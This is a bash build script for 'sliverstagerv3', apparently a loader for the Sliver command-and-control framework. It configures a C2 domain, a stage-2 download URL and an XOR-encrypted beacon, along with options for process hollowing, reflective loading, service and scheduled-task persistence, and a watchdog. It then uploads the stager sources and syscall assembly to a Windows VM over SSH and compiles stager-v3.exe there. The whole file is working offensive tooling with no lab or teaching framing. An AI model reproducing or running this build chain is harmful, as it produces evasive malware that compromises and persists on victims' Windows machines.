#!/bin/bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_FILE="${SCRIPT_DIR}/.sliverstagerv3.config"
WIN_BUILD_DIR='C:\SliverStagerBuilds'
HAS_SSHPASS=0
if command -v sshpass >/dev/null 2>&1; then
    HAS_SSHPASS=1
fi

trim() {
    printf '%s' "$1" | sed 's/^[[:space:]]*//; s/[[:space:]]*$//'
}

normalize_bool() {
    case "$(trim "${1:-0}")" in
        1|true|TRUE|yes|YES|on|ON|y|Y)
            echo 1
            ;;
        *)
            echo 0
            ;;
    esac
}

to_posix_path() {
    local path="$1"
    path="$(printf '%s' "$path" | tr '\\' '/')"
    echo "$path"
}

to_win_path() {
    local path="$1"
    echo "${path//\//\\}"
}

ensure_remote_parent_dir() {
    local remote_file="$1"
    local remote_dir="$remote_file"
    if [[ "$remote_file" == *\\* ]]; then
        remote_dir="${remote_file%\\*}"
    elif [ "${remote_file}" != "${remote_file%/*}" ]; then
        remote_dir="${remote_file%/*}"
    else
        remote_dir="${remote_file}"
    fi
    if [ "${remote_dir}" = "." ] || [ -z "$remote_dir" ]; then
        return 0
    fi
    remote_dir="$(to_win_path "$remote_dir")"
    if [ -z "$remote_dir" ]; then
        return 0
    fi
    run_ssh_cmd "if not exist \"$remote_dir\" mkdir \"$remote_dir\""
}

persist_mode_to_mask() {
    case "$(trim "${1}")" in
        service)
            echo 1
            ;;
        task)
            echo 2
            ;;
        both)
            echo 3
            ;;
        off|"")
            echo 0
            ;;
        *)
            echo "${2:-0}"
            ;;
    esac
}

persist_mask_to_name() {
    case "${1}" in
        1) echo "service" ;;
        2) echo "task" ;;
        3) echo "both" ;;
        *) echo "off" ;;
    esac
}

validate_xor_key() {
    local key
    key="$(trim "$1" | tr -d '\r')"
    if [ ${#key} -ne 32 ]; then
        echo "[!] XOR key must be exactly 32 hex chars." >&2
        return 1
    fi
    if ! printf '%s' "$key" | grep -Eq '^[0-9a-fA-F]{32}$'; then
        echo "[!] XOR key must be hex." >&2
        return 1
    fi
    echo "$key"
}

# Placeholder defaults — real values must come from .sliverstagerv3.config
# (copy .sliverstagerv3.config.example). Script refuses to run if any
# required value is still a placeholder.
WIN_VM_IP=""
WIN_USER=""
WIN_SSH_PASSWORD=""
C2_DOMAIN=""
C2_PORT="80"
STAGE2_URL=""
STAGE2_BEACON_NAME="stage.exe"
STAGE2_ENCRYPTED_NAME="output/stage-encrypted.bin"
XOR_KEY=""
STAGE_VERBOSE="1"
STAGE_KEEP_VERBOSE_LOG="1"
STAGE_SPAWN_MODE="system"
STAGE_PERSISTENCE="1"
STAGE_PERSISTENCE_MODE="1"
STAGE_WATCHDOG="1"
STAGE_SYSTEM_STRICT="1"
STAGE_SYSTEM_FALLBACK_TO_USER="0"
STAGE_ALLOW_DISK_STAGED_EXECUTION="0"
STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED="1"
STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK="0"
STAGE_BEACON_STATEFUL="0"

load_config() {
    [ -f "$CONFIG_FILE" ] || return 0
        while IFS='=' read -r key value; do
            key="$(trim "$key")"
            value="$(trim "$value")"
            [ -z "$key" ] && continue
            case "$key" in
            WIN_VM_IP) WIN_VM_IP="$value" ;;
            WIN_USER) WIN_USER="$value" ;;
            WIN_SSH_PASSWORD) WIN_SSH_PASSWORD="$value" ;;
            C2_DOMAIN) C2_DOMAIN="$value" ;;
            C2_PORT) C2_PORT="$value" ;;
            STAGE2_URL) STAGE2_URL="$value" ;;
            STAGE2_BEACON_NAME) STAGE2_BEACON_NAME="$value" ;;
            STAGE2_ENCRYPTED_NAME) STAGE2_ENCRYPTED_NAME="$value" ;;
            XOR_KEY) XOR_KEY="$value" ;;
            STAGE_VERBOSE) STAGE_VERBOSE="$(normalize_bool "$value")" ;;
            STAGE_KEEP_VERBOSE_LOG) STAGE_KEEP_VERBOSE_LOG="$(normalize_bool "$value")" ;;
            STAGE_SPAWN_MODE) STAGE_SPAWN_MODE="$(trim "$value")" ;;
            STAGE_PERSISTENCE) STAGE_PERSISTENCE="$(normalize_bool "$value")" ;;
            STAGE_PERSISTENCE_MODE) STAGE_PERSISTENCE_MODE="$value" ;;
            STAGE_WATCHDOG) STAGE_WATCHDOG="$(normalize_bool "$value")" ;;
            STAGE_SYSTEM_STRICT) STAGE_SYSTEM_STRICT="$(normalize_bool "$value")" ;;
            STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED) STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED="$(normalize_bool "$value")" ;;
            STAGE_SYSTEM_FALLBACK_TO_USER) STAGE_SYSTEM_FALLBACK_TO_USER="$(normalize_bool "$value")" ;;
            STAGE_ALLOW_DISK_STAGED_EXECUTION) STAGE_ALLOW_DISK_STAGED_EXECUTION="$(normalize_bool "$value")" ;;
            STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK) STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK="$(normalize_bool "$value")" ;;
            STAGE_BEACON_STATEFUL) STAGE_BEACON_STATEFUL="$(normalize_bool "$value")" ;;
        esac
    done < "$CONFIG_FILE"
}

apply_policy() {
    XOR_KEY="$(printf '%s' "$XOR_KEY" | tr -d '\r')"
    STAGE_SPAWN_MODE="$(trim "${STAGE_SPAWN_MODE}")"
    STAGE_SPAWN_MODE="$(printf '%s' "$STAGE_SPAWN_MODE" | tr '[:upper:]' '[:lower:]')"
    if [ "$STAGE_SPAWN_MODE" != "user" ] && [ "$STAGE_SPAWN_MODE" != "system" ]; then
        STAGE_SPAWN_MODE="system"
    fi

    STAGE_VERBOSE="$(normalize_bool "$STAGE_VERBOSE")"
    STAGE_KEEP_VERBOSE_LOG="$(normalize_bool "$STAGE_KEEP_VERBOSE_LOG")"
    STAGE_SYSTEM_STRICT="$(normalize_bool "$STAGE_SYSTEM_STRICT")"
    STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED="$(normalize_bool "$STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED")"
    STAGE_SYSTEM_FALLBACK_TO_USER="$(normalize_bool "$STAGE_SYSTEM_FALLBACK_TO_USER")"
    STAGE_WATCHDOG="$(normalize_bool "$STAGE_WATCHDOG")"
    STAGE_ALLOW_DISK_STAGED_EXECUTION="$(normalize_bool "$STAGE_ALLOW_DISK_STAGED_EXECUTION")"
    STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK="$(normalize_bool "$STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK")"
    STAGE_PERSISTENCE="$(normalize_bool "$STAGE_PERSISTENCE")"
    STAGE_BEACON_STATEFUL="$(normalize_bool "$STAGE_BEACON_STATEFUL")"

    if [ "$STAGE_PERSISTENCE" -eq 1 ] && [ "$STAGE_PERSISTENCE_MODE" -eq 0 ]; then
        STAGE_PERSISTENCE_MODE=1
    fi

    if [ "$STAGE_PERSISTENCE_MODE" -lt 0 ] || [ "$STAGE_PERSISTENCE_MODE" -gt 3 ]; then
        STAGE_PERSISTENCE_MODE=0
        STAGE_PERSISTENCE=0
    fi
    if [ "$STAGE_PERSISTENCE_MODE" -eq 0 ]; then
        STAGE_PERSISTENCE=0
    else
        STAGE_PERSISTENCE=1
    fi

    if [ "$STAGE_SPAWN_MODE" = "user" ]; then
        STAGE_SYSTEM_STRICT=0
        STAGE_SYSTEM_FALLBACK_TO_USER=0
        STAGE_SYSTEM_INJECTION=0
        STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED=0
        STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK=0
        STAGE_ALLOW_DISK_STAGED_EXECUTION=1
    else
        STAGE_SYSTEM_INJECTION=1
        STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED=1
        if [ "$STAGE_SYSTEM_STRICT" -eq 1 ]; then
            STAGE_SYSTEM_FALLBACK_TO_USER=0
            STAGE_ALLOW_DISK_STAGED_EXECUTION=0
            STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED=1
            STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK=0
        fi
    fi

    if ! validate_xor_key "$XOR_KEY" >/dev/null; then
        echo "[!] XOR_KEY missing or invalid. Set it in .sliverstagerv3.config" >&2
        exit 1
    fi
}

save_config() {
    cat > "$CONFIG_FILE" <<EOF
WIN_VM_IP=$WIN_VM_IP
WIN_USER=$WIN_USER
WIN_SSH_PASSWORD=$WIN_SSH_PASSWORD
C2_DOMAIN=$C2_DOMAIN
C2_PORT=$C2_PORT
STAGE2_URL=$STAGE2_URL
STAGE2_BEACON_NAME=$STAGE2_BEACON_NAME
STAGE2_ENCRYPTED_NAME=$STAGE2_ENCRYPTED_NAME
XOR_KEY=$XOR_KEY
STAGE_VERBOSE=$STAGE_VERBOSE
STAGE_KEEP_VERBOSE_LOG=$STAGE_KEEP_VERBOSE_LOG
STAGE_SPAWN_MODE=$STAGE_SPAWN_MODE
STAGE_PERSISTENCE=$STAGE_PERSISTENCE
STAGE_PERSISTENCE_MODE=$STAGE_PERSISTENCE_MODE
STAGE_WATCHDOG=$STAGE_WATCHDOG
    STAGE_SYSTEM_STRICT=$STAGE_SYSTEM_STRICT
    STAGE_SYSTEM_FALLBACK_TO_USER=$STAGE_SYSTEM_FALLBACK_TO_USER
    STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED=$STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED
    STAGE_ALLOW_DISK_STAGED_EXECUTION=$STAGE_ALLOW_DISK_STAGED_EXECUTION
    STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK=$STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK
    STAGE_BEACON_STATEFUL=$STAGE_BEACON_STATEFUL
EOF
}

ensure_password() {
    if [ -n "$WIN_SSH_PASSWORD" ]; then
        return 0
    fi
    echo -n "Password for ${WIN_USER}@${WIN_VM_IP}: "
    read -s WIN_SSH_PASSWORD < /dev/tty
    echo
}

run_ssh_cmd() {
    local cmd="$1"
    ensure_password
    if [ "$HAS_SSHPASS" -eq 1 ]; then
        sshpass -p "$WIN_SSH_PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$WIN_USER@$WIN_VM_IP" "$cmd"
    else
        ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$WIN_USER@$WIN_VM_IP" "$cmd"
    fi
}

run_scp_put() {
    local local_file="$1"
    local remote_file="$2"
    local remote_file_win="$remote_file"
    local remote_file_posix="$(to_posix_path "$remote_file")"
    local remote_file_cyg="/c/${remote_file_posix#*:/*/}"
    ensure_remote_parent_dir "$remote_file_win"

    local candidate
    if [ "$HAS_SSHPASS" -eq 1 ]; then
        for candidate in "$remote_file_posix" "$remote_file_win" "$remote_file_cyg"; do
            [ -z "$candidate" ] && continue
            if sshpass -p "$WIN_SSH_PASSWORD" scp -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$local_file" "$WIN_USER@$WIN_VM_IP:${candidate}"; then
                return
            fi
        done
        return 1
    else
        for candidate in "$remote_file_posix" "$remote_file_cyg" "$remote_file_win"; do
            [ -z "$candidate" ] && continue
            if scp -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$local_file" "$WIN_USER@$WIN_VM_IP:${candidate}"; then
                return
            fi
        done
        return 1
    fi
}

run_scp_get() {
    local remote_file="$1"
    local local_file="$2"
    local remote_file_win="$remote_file"
    local remote_file_posix="$(to_posix_path "$remote_file")"
    local remote_file_cyg="/c/${remote_file_posix#*:/*/}"
    ensure_remote_parent_dir "$remote_file_win"
    local candidate
    if [ "$HAS_SSHPASS" -eq 1 ]; then
        for candidate in "$remote_file_posix" "$remote_file_win" "$remote_file_cyg"; do
            [ -z "$candidate" ] && continue
            if sshpass -p "$WIN_SSH_PASSWORD" scp -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$WIN_USER@$WIN_VM_IP:${candidate}" "$local_file"; then
                return
            fi
        done
        return 1
    else
        for candidate in "$remote_file_posix" "$remote_file_cyg" "$remote_file_win"; do
            [ -z "$candidate" ] && continue
            if scp -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$WIN_USER@$WIN_VM_IP:${candidate}" "$local_file"; then
                return
            fi
        done
        return 1
    fi
}

check_prereqs() {
    local missing=0
    for file in "$SCRIPT_DIR/src/main_stager.c" "$SCRIPT_DIR/syscalls-x64.asm" "$SCRIPT_DIR/build-remote.bat" "$SCRIPT_DIR/encrypt.py"; do
        if [ ! -f "$file" ]; then
            echo "[!] Missing file: $file"
            missing=1
        fi
    done
    command -v ssh >/dev/null 2>&1 || { echo "[!] ssh missing"; missing=1; }
    command -v scp >/dev/null 2>&1 || { echo "[!] scp missing"; missing=1; }
    command -v sed >/dev/null 2>&1 || { echo "[!] sed missing"; missing=1; }
    [ "$missing" -eq 0 ] || return 1
    return 0
}

show_config() {
    echo "[CONFIG]"
    echo "WIN_VM_IP=$WIN_VM_IP"
    echo "WIN_USER=$WIN_USER"
    echo "C2_DOMAIN=$C2_DOMAIN"
    echo "C2_PORT=$C2_PORT"
    echo "STAGE2_URL=$STAGE2_URL"
    echo "STAGE2_BEACON_NAME=$STAGE2_BEACON_NAME"
    echo "STAGE2_ENCRYPTED_NAME=$STAGE2_ENCRYPTED_NAME"
    echo "STAGE_VERBOSE=$STAGE_VERBOSE"
    echo "STAGE_KEEP_VERBOSE_LOG=$STAGE_KEEP_VERBOSE_LOG"
    echo "STAGE_SPAWN_MODE=$STAGE_SPAWN_MODE"
    echo "STAGE_PERSISTENCE=$STAGE_PERSISTENCE"
    echo "STAGE_PERSISTENCE_MODE=$(persist_mask_to_name "$STAGE_PERSISTENCE_MODE")"
    echo "STAGE_WATCHDOG=$STAGE_WATCHDOG"
    echo "STAGE_SYSTEM_STRICT=$STAGE_SYSTEM_STRICT"
    echo "STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED=$STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED"
    echo "STAGE_SYSTEM_FALLBACK_TO_USER=$STAGE_SYSTEM_FALLBACK_TO_USER"
    echo "STAGE_ALLOW_DISK_STAGED_EXECUTION=$STAGE_ALLOW_DISK_STAGED_EXECUTION"
    echo "STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK=$STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK"
    echo "STAGE_BEACON_STATEFUL=$STAGE_BEACON_STATEFUL"
    echo "XOR_KEY=$XOR_KEY"
}

show_plan() {
    echo "Build plan:"
    echo "  1) SSH test"
    echo "  2) Create remote dirs"
    echo "  3) Inject runtime config into local build copy"
    echo "  4) Upload C stager + helper sources"
    echo "  5) Remote compile on VM"
    echo "  6) Download output/stager-v3.exe"
    echo
    echo "Remote compile defines:"
    echo "  STAGE_SPAWN_MODE=$STAGE_SPAWN_MODE"
    echo "  STAGE_PERSISTENCE_MODE=$(persist_mask_to_name "$STAGE_PERSISTENCE_MODE")"
    echo "  STAGE_WATCHDOG=$STAGE_WATCHDOG"
    echo "  STAGE_BEACON_STATEFUL=$STAGE_BEACON_STATEFUL"
}

test_connection() {
    echo "[*] testing SSH connection..."
    ensure_password
    run_ssh_cmd "ver"
    echo "[+] SSH test passed"
}

setup_windows() {
    echo "[*] ensuring remote build directories..."
    run_ssh_cmd "if not exist \"$WIN_BUILD_DIR\" mkdir \"$WIN_BUILD_DIR\" && if not exist \"$WIN_BUILD_DIR\\input\" mkdir \"$WIN_BUILD_DIR\\input\" && if not exist \"$WIN_BUILD_DIR\\output\" mkdir \"$WIN_BUILD_DIR\\output\""
    echo "[+] remote dirs ready"
}

inject_runtime_source() {
    local tmp
    tmp="$SCRIPT_DIR/windows-stager-build.c"
    cp "$SCRIPT_DIR/src/main_stager.c" "$tmp"
    if command -v perl >/dev/null 2>&1; then
        perl -0pi -e "s|#define STAGE2_URL \"[^\"]*\"|#define STAGE2_URL \"$STAGE2_URL\"|g" "$tmp"
        perl -0pi -e "s|#define STAGE2_XOR_KEY \"[0-9A-Fa-f]{32}\"|#define STAGE2_XOR_KEY \"$XOR_KEY\"|g" "$tmp"
        perl -0pi -e "s|#define STAGE_SPAWN_MODE [0-9]+|#define STAGE_SPAWN_MODE $([ \"$STAGE_SPAWN_MODE\" = \"system\" ] && echo 1 || echo 0)|g" "$tmp"
        perl -0pi -e "s|#define STAGE_PERSISTENCE [0-9]+|#define STAGE_PERSISTENCE $STAGE_PERSISTENCE|g" "$tmp"
        perl -0pi -e "s|#define STAGE_PERSISTENCE_MODE [0-9]+|#define STAGE_PERSISTENCE_MODE $STAGE_PERSISTENCE_MODE|g" "$tmp"
        perl -0pi -e "s|#define STAGE_WATCHDOG [0-9]+|#define STAGE_WATCHDOG $STAGE_WATCHDOG|g" "$tmp"
        perl -0pi -e "s|#define STAGE_SYSTEM_STRICT [0-9]+|#define STAGE_SYSTEM_STRICT $STAGE_SYSTEM_STRICT|g" "$tmp"
        perl -0pi -e "s|#define STAGE_SYSTEM_FALLBACK_TO_USER [0-9]+|#define STAGE_SYSTEM_FALLBACK_TO_USER $STAGE_SYSTEM_FALLBACK_TO_USER|g" "$tmp"
        perl -0pi -e "s|#define STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED [0-9]+|#define STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED $STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED|g" "$tmp"
        perl -0pi -e "s|#define STAGE_ALLOW_DISK_STAGED_EXECUTION [0-9]+|#define STAGE_ALLOW_DISK_STAGED_EXECUTION $STAGE_ALLOW_DISK_STAGED_EXECUTION|g" "$tmp"
        perl -0pi -e "s|#define STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK [0-9]+|#define STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK $STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK|g" "$tmp"
        perl -0pi -e "s|#define STAGE_BEACON_STATEFUL [0-9]+|#define STAGE_BEACON_STATEFUL $STAGE_BEACON_STATEFUL|g" "$tmp"
    fi
}

upload_sources() {
    echo "[*] uploading source files..."
    local remote_input="${WIN_BUILD_DIR}\\input"
    run_scp_put "$SCRIPT_DIR/windows-stager-build.c" "$remote_input\\windows-stager.c"
    run_scp_put "$SCRIPT_DIR/syscalls-x64.asm" "$remote_input\\syscalls-x64.asm"
    run_scp_put "$SCRIPT_DIR/src/token_utils.c" "$remote_input\\token_utils.c"
    run_scp_put "$SCRIPT_DIR/src/token_utils.h" "$remote_input\\token_utils.h"
    run_scp_put "$SCRIPT_DIR/src/persistence.c" "$remote_input\\persistence.c"
    run_scp_put "$SCRIPT_DIR/src/persistence.h" "$remote_input\\persistence.h"
    run_scp_put "$SCRIPT_DIR/src/watchdog.c" "$remote_input\\watchdog.c"
    run_scp_put "$SCRIPT_DIR/src/watchdog.h" "$remote_input\\watchdog.h"
    run_scp_put "$SCRIPT_DIR/build-remote.bat" "$WIN_BUILD_DIR\\build-remote.bat"
    rm -f "$SCRIPT_DIR/windows-stager-build.c"
}

run_remote_build() {
    local spawn_val
    if [ "$STAGE_SPAWN_MODE" = "system" ]; then
        spawn_val=1
    else
        spawn_val=0
        STAGE_SYSTEM_STRICT=0
        STAGE_SYSTEM_FALLBACK_TO_USER=0
    fi

    local remote_cmd
    remote_cmd="set STAGE_SPAWN_MODE=$spawn_val && "
    remote_cmd+="set STAGE_VERBOSE=$STAGE_VERBOSE && "
    remote_cmd+="set STAGE_KEEP_VERBOSE_LOG=$STAGE_KEEP_VERBOSE_LOG && "
    remote_cmd+="set STAGE_PERSISTENCE=$STAGE_PERSISTENCE && "
    remote_cmd+="set STAGE_PERSISTENCE_MODE=$STAGE_PERSISTENCE_MODE && "
    remote_cmd+="set STAGE_WATCHDOG=$STAGE_WATCHDOG && "
    remote_cmd+="set STAGE_SYSTEM_STRICT=$STAGE_SYSTEM_STRICT && "
    remote_cmd+="set STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED=$STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED && "
    remote_cmd+="set STAGE_SYSTEM_FALLBACK_TO_USER=$STAGE_SYSTEM_FALLBACK_TO_USER && "
    remote_cmd+="set STAGE_ALLOW_DISK_STAGED_EXECUTION=$STAGE_ALLOW_DISK_STAGED_EXECUTION && "
    remote_cmd+="set STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK=$STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK && "
    remote_cmd+="set STAGE_BEACON_STATEFUL=$STAGE_BEACON_STATEFUL && "
    remote_cmd+="set STAGE_SYSTEM_INJECTION=$([ \"$STAGE_SPAWN_MODE\" = \"system\" ] && echo 1 || echo 0) && "
    remote_cmd+="set STAGE_SYSTEM_STANDALONE=0 && "
    remote_cmd+="set STAGE2_URL=$STAGE2_URL && "
    remote_cmd+="set \"STAGE2_XOR_KEY=$XOR_KEY\" && "
    remote_cmd+="call \"$WIN_BUILD_DIR\\build-remote.bat\""

    run_ssh_cmd "cmd /c \"$remote_cmd\""
}

download_binary() {
    mkdir -p "$SCRIPT_DIR/output"
    rm -f "$SCRIPT_DIR/output/stager-v3.exe"
    run_ssh_cmd "if exist \"$WIN_BUILD_DIR\\output\\stager-v3.exe\" (exit 0) else (exit 1)"
    local remote_output="${WIN_BUILD_DIR}\\output\\stager-v3.exe"
    run_scp_get "$remote_output" "$SCRIPT_DIR/output/stager-v3.exe"
    if [ -f "$SCRIPT_DIR/output/stager-v3.exe" ]; then
        ls -lh "$SCRIPT_DIR/output/stager-v3.exe"
        if command -v strings >/dev/null 2>&1; then
            if ! strings "$SCRIPT_DIR/output/stager-v3.exe" | grep -q "Build config: spawn_mode="; then
                echo "[!] downloaded artifact does not include the V3 build signature"
                return 1
            fi
        fi
        if command -v shasum >/dev/null 2>&1; then
            shasum -a 256 "$SCRIPT_DIR/output/stager-v3.exe"
        elif command -v sha256sum >/dev/null 2>&1; then
            sha256sum "$SCRIPT_DIR/output/stager-v3.exe"
        fi
    else
        echo "[!] download failed"
        return 1
    fi
}

build_only() {
    check_prereqs
    test_connection
    setup_windows
    inject_runtime_source
    upload_sources
    run_remote_build
    echo "[+] build finished on VM"
}

build_full() {
    build_only
    download_binary
    echo "[+] output/stager-v3.exe ready"
}

encrypt_beacon() {
    local input="${1:-$STAGE2_BEACON_NAME}"
    local output="${2:-$STAGE2_ENCRYPTED_NAME}"
    python3 "$SCRIPT_DIR/encrypt.py" "$input" "$output" --key "$XOR_KEY"
    echo "[+] encrypted $input -> $output"
}

menu_edit_basic() {
    echo -n "Windows VM IP [$WIN_VM_IP]: "
    read -r value
    [ -n "$value" ] && WIN_VM_IP="$value"

    echo -n "Windows user [$WIN_USER]: "
    read -r value
    [ -n "$value" ] && WIN_USER="$value"

    echo -n "C2 domain [$C2_DOMAIN]: "
    read -r value
    [ -n "$value" ] && C2_DOMAIN="$value"

    echo -n "C2 port [$C2_PORT]: "
    read -r value
    [ -n "$value" ] && C2_PORT="$value"

    echo -n "Stage2 URL [$STAGE2_URL]: "
    read -r value
    [ -n "$value" ] && STAGE2_URL="$value"

    echo -n "Beacon input file [$STAGE2_BEACON_NAME]: "
    read -r value
    [ -n "$value" ] && STAGE2_BEACON_NAME="$value"

    echo -n "Beacon output file [$STAGE2_ENCRYPTED_NAME]: "
    read -r value
    [ -n "$value" ] && STAGE2_ENCRYPTED_NAME="$value"
}

run_menu() {
    while true; do
        echo
        echo "[sliverstagerv3 build GUI]"
        echo "1) Test connection"
        echo "2) Setup VM dirs"
        echo "3) Full build now"
        echo "4) Build only"
        echo "5) Edit settings"
        echo "6) Toggle spawn mode (current: $STAGE_SPAWN_MODE)"
        echo "7) Set persistence (off/service/task/both) (current: $(persist_mask_to_name "$STAGE_PERSISTENCE_MODE"))"
        echo "8) Toggle watchdog (current: $STAGE_WATCHDOG)"
        echo "9) Toggle verbose (current: $STAGE_VERBOSE)"
        echo "10) Encrypt beacon"
        echo "11) Show config / plan"
        echo "12) Save and exit"
        echo -n "Choice: "
        read -r choice
        case "$choice" in
            1) test_connection ;;
            2) setup_windows ;;
            3) build_full ;;
            4) build_only ;;
            5) menu_edit_basic ;;
            6) if [ "$STAGE_SPAWN_MODE" = "system" ]; then STAGE_SPAWN_MODE=user; else STAGE_SPAWN_MODE=system; fi ;;
            7)
                echo -n "Persistence mode [off/service/task/both]: "
                read -r value
                STAGE_PERSISTENCE_MODE="$(persist_mode_to_mask "$value" "$STAGE_PERSISTENCE_MODE")"
                if [ "$STAGE_PERSISTENCE_MODE" -eq 0 ]; then STAGE_PERSISTENCE=0; else STAGE_PERSISTENCE=1; fi
                ;;
            8) if [ "$STAGE_WATCHDOG" -eq 1 ]; then STAGE_WATCHDOG=0; else STAGE_WATCHDOG=1; fi ;;
            9) if [ "$STAGE_VERBOSE" -eq 1 ]; then STAGE_VERBOSE=0; else STAGE_VERBOSE=1; fi ;;
            10)
                echo -n "Beacon input [${STAGE2_BEACON_NAME}]: "
                read -r beacon_in
                echo -n "Beacon output [${STAGE2_ENCRYPTED_NAME}]: "
                read -r beacon_out
                encrypt_beacon "${beacon_in:-$STAGE2_BEACON_NAME}" "${beacon_out:-$STAGE2_ENCRYPTED_NAME}"
                ;;
            11) show_plan; show_config ;;
            12) apply_policy; save_config; echo "Config saved: $CONFIG_FILE"; break ;;
            *) echo "[!] invalid option" ;;
        esac
        apply_policy
        save_config
    done
}

menu() {
    run_menu
}

usage() {
    cat <<EOF
Usage:
  ./remote-build.sh
  ./remote-build.sh build [--mode user|system] [--verbose|--quiet] [--persistence off|service|task|both] [--watchdog|--no-watchdog]
        [--disk-staged|--no-disk-staged] [--system-reflective|--no-system-reflective]
        [--system-hollowing|--no-system-hollowing]
  ./remote-build.sh build-only [same flags]
  ./remote-build.sh test|plan|config|encrypt
EOF
}

load_config
apply_policy

if [ "$#" -eq 0 ]; then
    run_menu
    exit 0
fi

ACTION="menu"
while [ "$#" -gt 0 ]; do
    case "${1:-}" in
        build)
            ACTION="build"
            shift
            ;;
        build-only)
            ACTION="build-only"
            shift
            ;;
        test)
            ACTION="test"
            shift
            ;;
        plan)
            ACTION="plan"
            shift
            ;;
        config)
            ACTION="config"
            shift
            ;;
        encrypt)
            ACTION="encrypt"
            shift
            break
            ;;
        --mode)
            STAGE_SPAWN_MODE="$(trim "${2:-system}")"
            shift 2
            ;;
        --verbose)
            STAGE_VERBOSE=1
            shift
            ;;
        --quiet)
            STAGE_VERBOSE=0
            shift
            ;;
        --persistence)
            STAGE_PERSISTENCE_MODE="$(persist_mode_to_mask "${2:-off}" "$STAGE_PERSISTENCE_MODE")"
            if [ "$STAGE_PERSISTENCE_MODE" -eq 0 ]; then
                STAGE_PERSISTENCE=0
            else
                STAGE_PERSISTENCE=1
            fi
            shift 2
            ;;
        --watchdog)
            STAGE_WATCHDOG=1
            shift
            ;;
        --no-watchdog)
            STAGE_WATCHDOG=0
            shift
            ;;
        --disk-staged)
            STAGE_ALLOW_DISK_STAGED_EXECUTION=1
            shift
            ;;
        --no-disk-staged)
            STAGE_ALLOW_DISK_STAGED_EXECUTION=0
            shift
            ;;
        --system-reflective)
            STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK=1
            shift
            ;;
        --no-system-reflective)
            STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK=0
            shift
            ;;
        --system-hollowing)
            STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED=1
            shift
            ;;
        --no-system-hollowing)
            STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED=0
            shift
            ;;
        -h|--help|help)
            usage
            exit 0
            ;;
        *)
            break
            ;;
    esac
done

apply_policy
save_config

case "$ACTION" in
    build)
        build_full
        ;;
    build-only)
        build_only
        ;;
    test)
        test_connection
        ;;
    plan)
        show_plan
        show_config
        ;;
    config)
        menu_edit_basic
        save_config
        show_config
        ;;
    encrypt)
        encrypt_beacon "${1:-$STAGE2_BEACON_NAME}" "${2:-$STAGE2_ENCRYPTED_NAME}"
        ;;
    *)
        usage
        exit 1
        ;;
esac
